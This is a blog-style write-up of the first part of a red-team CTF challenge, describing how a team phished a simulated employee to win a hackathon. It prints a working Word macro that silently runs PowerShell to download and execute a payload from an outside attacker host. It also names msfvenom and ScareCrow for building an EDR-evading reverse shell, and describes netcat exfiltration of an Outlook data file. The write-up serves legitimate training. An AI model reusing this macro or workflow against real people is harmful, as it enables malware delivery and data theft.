---
title: "ABC CTF Challenge"
date: 2021-08-28T03:09:07-03:00
draft: false
cover: "images/abcctf/2021_cybersecurity"
blogs: ["CTF_Challenges"]
---

## ABC CyberHackathon RedTeam CTF

[![CY3ER-R4T](https://cyberrat.medium.com/)
## **INTRODUCTION**

My team RedTeamNG recently came first in the The American Business Council Cybersecurity Hackathon 2021 organized by ctf.ng and major sponsors bothering from American Business Council,Microsoft,AWS, Cisco, Comercio, HP, IBM and others

This write up would be focused only on the finals and specifically the RedTeam challenges running through the methodology used to tackling it,  
other post by my team mate [Muzec](https://muzec0318.github.io/posts/abcctf.html)would be covering the Web Challenges.

## **SCENARIO**

The scenario we are presented with by the organizers is that of an Fat Fingered individual that unconsciously opens every email and attachment he gets in he’s corporate email : [obiora\_nurudeen@ctf.ng](http://mailto:obiora_nurudeen@ctf.ng)

{{< figure src="/images/abcctf/scenario.png">}}

Armed with just he’s name Nurudeen Obiora, the email above and the knowledge of the targets low awareness in basic email security,  
we thought of emulating a strategy we recently used at the DEFCON 29 RedTeam CTF by sending the target an email with the reverse shell payload attached.

Now here is where the problem begins, as with almost every field: There is a race, race between Good and Bad, Positive and Negative  
our intentions are of no good so every mechanism of security is against us which is a “replica” of a real life situation

**1st attempt:** _Sending an msfvenom payload + gmail_  
Using msfvenom we created a windows reverse shell payload


{{< figure src="/images/abcctf/msfvenom.gif">}}

Attempting to send it to the target using swaks  
swaks : SWiss Army Knife Smtp

we are immediately flagged as malicious by Gmails Egress Malware Scanner

{{< figure src="/images/abcctf/egress-gmail.gif">}}

**2nd attempts:** We resulted into trying several empire powershell payload and bypasses, Persian Hydra Xor encryption with Custom keys, EgeBalci/sgn Shikata\_ga\_nai encoder, All to no avail

{{< figure src="/images/abcctf/head-boom.gif">}}

**Final attempt:** After numerous swift and failed attempt, we remembered Matthew Eidelberg talk at SourceZero Con : Remaining Invisible in the Age of EDR, a talk which showcase the ability to bypass defenses with a term called DLL unhooking using the ScareCrow Binary

In short, we can generate some raw shellcode from the software of our choice (Cobalt Strike, Metasploit, PoshC2, etc) and pass it to the Scarecrow to get a loader back that will implement some common EDR evasion techniques.

we decide to create a create a `windows/x64/meterpreter\reverse\tcp` shellcode using msfvenom \[msfvenom shellcode is a pain, its crappy and might be unstable at times\]
{{< figure src="/images/abcctf/msfvenom.gif">}}

then pass the raw shellcode to the scarecrow binary along with a random domain name for a cloned signed certificate

{{< figure src="/images/abcctf/scarecrow.png">}}

we then created a meterpreter listener using the connection variable of the shellcode as options: “would have preferred Cobalt-strike but its for the BigBoys like InfosecShinobi 🙂”

## **DELIVERY**

The output of ScareCrow is an obfuscated .exe payload, being at the third stage of the “cyber attack cycle” which is delivery  
we somehow need to get the payload the victim machine and “run” it

We decided to use the old aged Microsoft Word Document with macro in the .docm extension,  
the function of the macro was to run a powershell one-liner that downloads the payload \[Powerpnt.exe\] binary hosted on our machine, store it in C:\\windows\\temp\\ and then run it

> Sub Document\_Open()  
> MyMacro  
> End Sub
> 
> Sub AutoOpen()  
> MyMacro  
> End Sub
> 
> Sub MyMacro()  
> Dim str As String  
> str = “powershell iwr -uri [http://x.x.x.x/](http://20.87.43.15/OutLook.exe)Powerpnt.exe -o c:\\windows\\temp\\Powerpnt.exe; c:\\windows\\temp\\Powerpnt.exe”  
> GetObject**(**“winmgmts:”**)**.Get**(**“Win32\_Process”**)**.Create str, Null, Null, pid  
> Shell str, vbHide  
> End Sub


{{< figure src="/images/abcctf/macro.png">}}

## **WEAPONIZATION**

Weaponized the final email and sent the .docm to the target by gmail

{{< figure src="/images/abcctf/weapon-email.png">}} 

Tick! tock! Tick! tock!  
Itchy finger Nurudeen opens the malicious document with the payload sending us a meterpreter session on our VPS \[wish it was cobalt strike, somebody buy us cobalt strike already!!\]

{{< figure src="/images/abcctf/meterpreter.png">}} 

Now the hunt for flags begin, which literally means _ENUMERATION_  
checking to see what the internal IP looks like, we find the user IP address we we already solved the unintended way by checking the header of the response email`\[FLAG8\]`

{{< figure src="/images/abcctf/header.png">}}

checking the current user directory and finding `unattend.xml` that contains `\[FLAG4\]`

{{< figure src="/images/abcctf/ctf_xml.jpeg">}}

curious about what local users are on the machine just to get an idea of what movement of privilege escalation was necessary, lateral or horizontal  
we find two more flags `\[FLAG3\]` `\[FLAG5\]`


{{< figure src="/images/abcctf/net_user.jpeg">}}

One of the challenges goes by the name “Registry Never Lies” which immediately prompted us to query the registry table to find \[FLAG2\]

{{< figure src="/images/abcctf/regq.jpeg">}}


The what seems to be easy challenge turned to a battle “Outlook Storage 150points”, as most application data are stored in %APPDATA% we dived into it to get our hands on the loot after a quick research we figure the ost file is the microsoft outlook data bucket trying to transfer the file using the netcat binary, it failed cause the file was currently locked with the outlook process.

We proceeded to killing the process and sending the OST to our local machine with netcat

{{< figure src="/images/abcctf/task_kill.jpeg">}}

Converting the ost with the steller converter we find `\[FLAG1\]`

{{< figure src="/images/abcctf/steller.png">}}

After running out of flags to find, it was time for horizontal privilege escalation

## **LATERAL PRIVILEGE ESCALATION  
Machine Misconfigured with an Unquoted Service Path**

Sometimes it is possible to escalate privileges by abusing mis-configured services. Specifically, this is possible if path to the service binary is not wrapped in quotes and there are spaces in the path..  
If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin; otherwise, the file name is ambiguous.

For example, consider the string “c:\\program files\\safe software\\enjoy.exe”. This string can be interpreted in a number of ways.  
The system tries to interpret the possibilities in the following order:

**c:\\program.exe**  
**c:\\program files\\safe.exe**  
**c:\\program files\\safe software\\enjoy.exe**

if any of the directory along the path is writable and said service is running with system privileges then this misconfiguration is easily exploitable

we can enumerate and find Unquoted Service Path by using the wmic command `wmic service get name,pathname`

we can aswell check to see if the service is running with system privileges still by using wmic `wmic service get pathname,startname`


{{< figure src="/images/abcctf/servicepath.png">}}

> **END OF PART ONE**
>#### The difference between a noob and a hacker is that a hacker has failed more than a noob has ever tried

